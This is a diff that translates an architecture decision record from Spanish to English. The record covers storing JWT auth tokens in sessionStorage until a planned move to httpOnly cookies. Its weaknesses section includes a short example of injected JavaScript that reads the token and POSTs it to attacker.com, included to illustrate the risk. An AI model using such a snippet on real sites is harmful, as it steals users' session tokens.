@@ -1,29 +1,29 @@
-# ADR-003: sessionStorage para Autenticación (Solución Temporal)
+# ADR-003: sessionStorage for Authentication (Temporary Solution)
 
-**Fecha**: 12 de noviembre de 2025
-**Estado**: Aceptado (Temporal - Migración Planeada)
-**Decisores**: Equipo de desarrollo frontend
-**Supersede por**: ADR-004 (Migración a httpOnly Cookies) - Planeado para v1.8.0
+**Date**: November 12, 2025
+**Status**: Accepted (Temporary - Migration Planned)
+**Decision Makers**: Frontend development team
+**Superseded by**: ADR-004 (Migration to httpOnly Cookies) - Planned for v1.8.0
 
-## Contexto y Problema
+## Context and Problem
 
-Necesitamos almacenar JWT tokens en el cliente para mantener sesiones de usuario. Requisitos:
+We need to store JWT tokens on the client to maintain user sessions. Requirements:
 
-- Persistencia mientras el usuario usa la aplicación
-- Accesible desde JavaScript para incluir en headers `Authorization`
-- Protección contra ataques comunes (XSS, CSRF)
-- Experiencia de usuario fluida (sin re-login constante)
+- Persistence while the user is using the application
+- Accessible from JavaScript to include in `Authorization` headers
+- Protection against common attacks (XSS, CSRF)
+- Smooth user experience (no constant re-login)
 
-## Opciones Consideradas
+## Options Considered
 
-1. **localStorage**: Persiste indefinidamente, compartido entre tabs
-2. **sessionStorage**: Persiste solo durante la sesión, aislado por tab
-3. **httpOnly Cookies**: Manejadas por el navegador, no accesibles desde JS
-4. **Memory only (useState)**: Desaparece al refrescar página
+1. **localStorage**: Persists indefinitely, shared between tabs
+2. **sessionStorage**: Persists only during the session, isolated per tab
+3. **httpOnly Cookies**: Managed by the browser, not accessible from JS
+4. **Memory only (useState)**: Disappears on page refresh
 
-## Decisión
+## Decision
 
-**Adoptamos sessionStorage temporalmente** para almacenar JWT tokens:
+**We temporarily adopt sessionStorage** to store JWT tokens:
 
 ```javascript
 // src/utils/secureAuth.js
@@ -38,51 +38,51 @@ export const getAuthToken = () => {
 };
 ```
 
-**⚠️ Esta es una solución temporal. Plan de migración a httpOnly cookies en v1.8.0**
+**This is a temporary solution. Migration plan to httpOnly cookies in v1.8.0**
 
-## Justificación
+## Rationale
 
-### Por qué sessionStorage (vs localStorage):
+### Why sessionStorage (vs localStorage):
 
-| Aspecto | sessionStorage | localStorage |
-|---------|---------------|--------------|
-| **Persistencia** | Solo sesión de tab | Indefinida |
-| **Compartir entre tabs** | ❌ No (aislado) | ✅ Sí |
-| **Auto-cleanup** | ✅ Sí (cerrar tab) | ❌ No |
-| **Vulnerabilidad XSS** | ⚠️ Alta | ⚠️ Alta |
-| **Lifetime reducido** | ✅ Sí | ❌ No |
+| Aspect | sessionStorage | localStorage |
+|--------|---------------|--------------|
+| **Persistence** | Tab session only | Indefinite |
+| **Shared between tabs** | No (isolated) | Yes |
+| **Auto-cleanup** | Yes (close tab) | No |
+| **XSS Vulnerability** | High | High |
+| **Reduced lifetime** | Yes | No |
 
-**sessionStorage es ligeramente más seguro** porque:
-1. **Auto-cleanup**: Token desaparece al cerrar tab
-2. **Aislamiento**: Un tab comprometido no afecta otros
-3. **Lifetime corto**: Reduce ventana de ataque
+**sessionStorage is slightly more secure** because:
+1. **Auto-cleanup**: Token disappears when closing tab
+2. **Isolation**: A compromised tab does not affect others
+3. **Short lifetime**: Reduces attack window
 
-### Por qué NO httpOnly Cookies (ahora):
+### Why NOT httpOnly Cookies (now):
 
-**Requiere cambios en backend:**
-- FastAPI debe enviar cookies en lugar de JSON response
-- Middleware de auth debe leer cookies en lugar de headers
-- Configuración CORS con `credentials: 'include'`
+**Requires backend changes:**
+- FastAPI must send cookies instead of JSON response
+- Auth middleware must read cookies instead of headers
+- CORS configuration with `credentials: 'include'`
 
-**Plan**: Migrar a httpOnly cookies en v1.8.0 (coordinado frontend + backend)
+**Plan**: Migrate to httpOnly cookies in v1.8.0 (coordinated frontend + backend)
 
-## Consecuencias
+## Consequences
 
-### Positivas:
-- ✅ **Implementación rápida**: Sin cambios en backend
-- ✅ **Auto-cleanup**: Token se borra al cerrar tab
-- ✅ **Aislamiento**: No compartido entre tabs
-- ✅ **Compatible**: Con autenticación actual de backend
+### Positive:
+- ✅ **Quick implementation**: No backend changes
+- ✅ **Auto-cleanup**: Token is deleted when closing tab
+- ✅ **Isolation**: Not shared between tabs
+- ✅ **Compatible**: With current backend authentication
 
-### Negativas (Vulnerabilidades):
-- ❌ **Vulnerable a XSS**: JavaScript puede robar el token
-- ❌ **Sin protección CSRF**: Token accesible desde JavaScript
-- ❌ **Requiere header manual**: `Authorization: Bearer ${token}`
-- ❌ **No persiste**: Usuario debe re-login al cerrar tab
+### Negative (Vulnerabilities):
+- ❌ **Vulnerable to XSS**: JavaScript can steal the token
+- ❌ **No CSRF protection**: Token accessible from JavaScript
+- ❌ **Requires manual header**: `Authorization: Bearer ${token}`
+- ❌ **Does not persist**: User must re-login when closing tab
 
-### Vulnerabilidad XSS Ejemplo:
+### XSS Vulnerability Example:
 ```javascript
-// Si un atacante inyecta este código:
+// If an attacker injects this code:
 const token = sessionStorage.getItem('auth_token');
 fetch('https://attacker.com/steal', {
   method: 'POST',
@@ -90,24 +90,24 @@ fetch('https://attacker.com/steal', {
 });
 ```
 
-**Mitigaciones Actuales:**
-1. **Content Security Policy (CSP)** en index.html
-2. **React Auto-Escaping**: Previene XSS en JSX
-3. **Input Validation**: Sanitización en formularios
-4. **No dangerouslySetInnerHTML**: Evitado en toda la app
+**Current Mitigations:**
+1. **Content Security Policy (CSP)** in index.html
+2. **React Auto-Escaping**: Prevents XSS in JSX
+3. **Input Validation**: Sanitization in forms
+4. **No dangerouslySetInnerHTML**: Avoided throughout the app
 
-**Mitigación Planificada (v1.8.0):**
-- Migración a httpOnly cookies (elimina acceso desde JavaScript)
+**Planned Mitigation (v1.8.0):**
+- Migration to httpOnly cookies (eliminates access from JavaScript)
 
-## Validación
+## Validation
 
-Criterios de éxito temporal:
-- [x] Autenticación funcional (✅ Login/Register/Logout)
-- [x] Token incluido en requests API (✅ Headers Authorization)
-- [x] Auto-limpieza al cerrar tab (✅ sessionStorage nativo)
-- [ ] Migración a httpOnly cookies (⏳ Planeado v1.8.0)
+Temporary success criteria:
+- [x] Functional authentication (✅ Login/Register/Logout)
+- [x] Token included in API requests (✅ Authorization Headers)
+- [x] Auto-cleanup when closing tab (✅ native sessionStorage)
+- [ ] Migration to httpOnly cookies (Planned v1.8.0)
 
-## Plan de Migración (v1.8.0)
+## Migration Plan (v1.8.0)
 
 ### Backend Changes Required:
 ```python
@@ -118,50 +118,50 @@ async def login(response: Response):
     response.set_cookie(
         key="access_token",
         value=token,
-        httponly=True,  # ✅ No accesible desde JavaScript
-        secure=True,    # ✅ Solo HTTPS
-        samesite="lax", # ✅ Protección CSRF
+        httponly=True,  # ✅ Not accessible from JavaScript
+        secure=True,    # ✅ HTTPS only
+        samesite="lax", # ✅ CSRF protection
         max_age=3600
     )
-    return {"user": user_dto}  # NO enviar token en body
+    return {"user": user_dto}  # Do NOT send token in body
 ```
 
 ### Frontend Changes Required:
 ```javascript
-// Eliminar setAuthToken/getAuthToken
-// Usar fetch con credentials: 'include'
+// Remove setAuthToken/getAuthToken
+// Use fetch with credentials: 'include'
 fetch(url, {
-  credentials: 'include',  // Envía cookies automáticamente
+  credentials: 'include',  // Sends cookies automatically
   headers: {
     'Content-Type': 'application/json'
-    // NO incluir Authorization header
+    // Do NOT include Authorization header
   }
 })
 ```
 
-## Referencias
+## References
 
 - [OWASP: JWT Storage Best Practices](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
 - [Security: localStorage vs sessionStorage vs Cookies](https://stormpath.com/blog/where-to-store-your-jwts-cookies-vs-html5-web-storage)
-- [SECURITY_MIGRATION.md](../../SECURITY_MIGRATION.md) - Guía de migración completa
-- Backend ADR (futuro): Migración a httpOnly Cookies
+- [SECURITY_MIGRATION.md](../../SECURITY_MIGRATION.md) - Complete migration guide
+- Backend ADR (future): Migration to httpOnly Cookies
 
-## Notas de Implementación
+## Implementation Notes
 
-### Implementado (v1.0.0 - v1.7.0):
-- ✅ `src/utils/secureAuth.js` con helpers de sessionStorage
-- ✅ Migración automática desde localStorage (usuarios antiguos)
-- ✅ Validación de expiración de tokens (JWT decode)
-- ✅ Cleanup al logout
+### Implemented (v1.0.0 - v1.7.0):
+- ✅ `src/utils/secureAuth.js` with sessionStorage helpers
+- ✅ Automatic migration from localStorage (legacy users)
+- ✅ Token expiration validation (JWT decode)
+- ✅ Cleanup on logout
 
-### Archivos Afectados en Migración Futura:
-- `src/utils/secureAuth.js` - Eliminar setAuthToken/getAuthToken
-- `src/infrastructure/*/Api*Repository.js` - Agregar `credentials: 'include'`
-- `src/pages/Login.jsx` - No guardar token manualmente
-- `src/pages/Register.jsx` - No guardar token manualmente
+### Files Affected in Future Migration:
+- `src/utils/secureAuth.js` - Remove setAuthToken/getAuthToken
+- `src/infrastructure/*/Api*Repository.js` - Add `credentials: 'include'`
+- `src/pages/Login.jsx` - Do not save token manually
+- `src/pages/Register.jsx` - Do not save token manually
 
-## Relacionado
+## Related
 
-- ADR-004: Migración a httpOnly Cookies (planeado v1.8.0)
-- ADR-005: Sentry para Error Tracking
-- ROADMAP.md - Sección "Seguridad - Prioridad CRÍTICA"
+- ADR-004: Migration to httpOnly Cookies (planned v1.8.0)
+- ADR-005: Sentry for Error Tracking
+- ROADMAP.md - Section "Security - CRITICAL Priority"
